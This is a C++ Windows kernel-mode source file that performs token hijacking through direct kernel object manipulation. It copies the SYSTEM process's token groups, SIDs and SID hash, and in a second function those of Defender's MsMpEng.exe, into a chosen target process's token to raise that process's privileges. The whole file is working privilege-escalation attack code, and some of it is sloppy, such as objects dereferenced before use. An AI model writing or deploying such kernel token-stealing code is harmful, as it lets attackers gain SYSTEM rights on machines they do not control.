
#include "token_hijacking.h"

extern "C" namespace token_hijacking {


	//
	// link - https://davidechiappetta.wordpress.com/2012/05/12/token-privilege-and-group-elevation-with-dkom/#ch07fig05
	//
	bool copy_sid_and_attributes(PTOKEN pSystemToken, PTOKEN pTargetToken) {
		bool b_res = true;

		__int64 system_offset = 0;		
		const ULONG64 system_groups_count = pSystemToken->UserAndGroupCount;
		for (ULONG i = 0; i < system_groups_count; i++){

			pTargetToken->UserAndGroups[i].Attributes = pSystemToken->UserAndGroups[i].Attributes;
			
			system_offset = (char*)pSystemToken->UserAndGroups[i].Sid - 
				(char*)&pSystemToken->UserAndGroups[i];
			// for the first entry    system_offset =  sizeof(SID_AND_ATTRIBUTES) * system_groups_count;
			
			pTargetToken->UserAndGroups[i].Sid = 
				(char*)&pTargetToken->UserAndGroups[i] + system_offset; //TargetTokenStruct->UserAndGroups;
				//current_target_sid_entry;
			
			((SID*)pTargetToken->UserAndGroups[i].Sid)->Revision = 
				((SID*)pSystemToken->UserAndGroups[i].Sid)->Revision;

			((SID*)pTargetToken->UserAndGroups[i].Sid)->SubAuthorityCount =
				((SID*)pSystemToken->UserAndGroups[i].Sid)->SubAuthorityCount;

			RtlCopyMemory(
				&((SID*)pTargetToken->UserAndGroups[i].Sid)->IdentifierAuthority,
				&((SID*)pSystemToken->UserAndGroups[i].Sid)->IdentifierAuthority,
				sizeof(SID::IdentifierAuthority) );

			UCHAR system_subs_count = ((SID*)pSystemToken->UserAndGroups[i].Sid)->SubAuthorityCount;
			
			for (UCHAR j = 0 ; j < system_subs_count; j++ ){
				((SID*)pTargetToken->UserAndGroups[i].Sid)->SubAuthority[j] =
					((SID*)pSystemToken->UserAndGroups[i].Sid)->SubAuthority[j];
			}
		}

		RtlCopyMemory(
			&pTargetToken->SidHash,
			&pSystemToken->SidHash,
			sizeof(SID_AND_ATTRIBUTES_HASH));

// 		RtlCopyMemory(
// 			&pTargetToken->SidHash.Hash,
// 			&pSystemToken->SidHash.Hash,
// 			sizeof(SID_AND_ATTRIBUTES_HASH::Hash));
// 
// 		pTargetToken->SidHash.SidAttr = pSystemToken->SidHash.SidAttr;
// 		pTargetToken->SidHash.SidCount = pSystemToken->SidHash.SidCount;

		pTargetToken->UserAndGroupCount = pSystemToken->UserAndGroupCount;
//		UserAndGroupCount - might be implemented in 'payload.asm'
//
		if (0){

			RtlCopyMemory(&pTargetToken->TokenSource, &pSystemToken->TokenSource, sizeof(TOKEN_SOURCE));
			RtlCopyMemory(&pTargetToken->TokenId, &pSystemToken->TokenId, sizeof(LUID));
			RtlCopyMemory(&pTargetToken->AuthenticationId, &pSystemToken->AuthenticationId, sizeof(LUID));
			RtlCopyMemory(&pTargetToken->ParentTokenId, &pSystemToken->ParentTokenId, sizeof(LUID));

			RtlCopyMemory(&pTargetToken->Privileges, &pSystemToken->Privileges, sizeof(SEP_TOKEN_PRIVILEGES));

/*???*/		RtlCopyMemory(&pTargetToken->AuditPolicy, &pSystemToken->AuditPolicy, sizeof(SEP_AUDIT_POLICY));	

			pTargetToken->DefaultOwnerIndex = pSystemToken->DefaultOwnerIndex;
			pTargetToken->PrimaryGroup = pSystemToken->PrimaryGroup;
			pTargetToken->DynamicPart = pSystemToken->DynamicPart;
			pTargetToken->DefaultDacl = pSystemToken->DefaultDacl;

			pTargetToken->TokenFlags = pSystemToken->TokenFlags;
			pTargetToken->IntegrityLevelIndex = pSystemToken->IntegrityLevelIndex;
			pTargetToken->MandatoryPolicy = pSystemToken->MandatoryPolicy;
			pTargetToken->pSecurityAttributes = pSystemToken->pSecurityAttributes;
		}

		return b_res;
	}

	bool hijacking(const DWORD targetPID) {
		bool b_res = false;
		PEPROCESS target_proc = NULL;
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)targetPID, &target_proc))) {
			if (target_proc) { ObDereferenceObject(target_proc); }
			MEM_ATTACKER_LOGGER("has found the EPROCESS struct for the %s:%d",
				PsGetProcessImageFileName(target_proc),
				targetPID);

			ULONG64 system_token = *(ULONG64*)((char*)PsInitialSystemProcess + g_EprocOffsets.Token);
			system_token &= ~0xF; // < clear 4 low bits for the _EX_FAST_REF.RefCnt 

			ULONG64 target_token = *(ULONG64*)((char*)target_proc + g_EprocOffsets.Token);
			target_token &= ~0xF; // < clear 4 low bits for the _EX_FAST_REF.RefCnt 	

			PTOKEN system_token_struct = (PTOKEN)system_token;
			PTOKEN target_token_struct = (PTOKEN)target_token;
		
			if ((0 != system_token_struct->TokenSource.SourceName[0]) &&
				(0 != target_token_struct->TokenSource.SourceName[0])){
				b_res = copy_sid_and_attributes(system_token_struct, target_token_struct);
			}
		}
		return b_res;
	}

	bool hijacking2(const DWORD targetPID) {
		bool b_res = false;
		PEPROCESS MsMpEngProcess = NULL;
		HANDLE ProcessId = (HANDLE)0x07b4;
		if (NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &MsMpEngProcess))) {
			PCHAR processName = (PCHAR)PsGetProcessImageFileName(MsMpEngProcess);
			CHAR explorerexe_name[] = "MsMpEng.exe";
			size_t len = sizeof(explorerexe_name) - 1;
			b_res = (len == RtlCompareMemory(explorerexe_name, processName, len));
			if (MsMpEngProcess) {
				ObDereferenceObject(MsMpEngProcess);
			}

			ULONG64 MsMpEng_token = *(ULONG64*)((char*)MsMpEngProcess + g_EprocOffsets.Token);
			MsMpEng_token &= ~0xF; // < clear 4 low bits for the _EX_FAST_REF.RefCnt 

			PEPROCESS target_proc = NULL;
			if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)targetPID, &target_proc))) {
				if (target_proc) { ObDereferenceObject(target_proc); }
				MEM_ATTACKER_LOGGER("has found the EPROCESS struct for the %s:%d",
					PsGetProcessImageFileName(target_proc),
					targetPID);
			}

			ULONG64 target_token = *(ULONG64*)((char*)target_proc + g_EprocOffsets.Token);
			target_token &= ~0xF; // < clear 4 low bits for the _EX_FAST_REF.RefCnt 	

			PTOKEN system_token_struct = (PTOKEN)MsMpEng_token;
			PTOKEN target_token_struct = (PTOKEN)target_token;

			if ((0 != system_token_struct->TokenSource.SourceName[0]) &&
				(0 != target_token_struct->TokenSource.SourceName[0])) {
				b_res = copy_sid_and_attributes(system_token_struct, target_token_struct);
			}

		}
		return b_res;


	}
}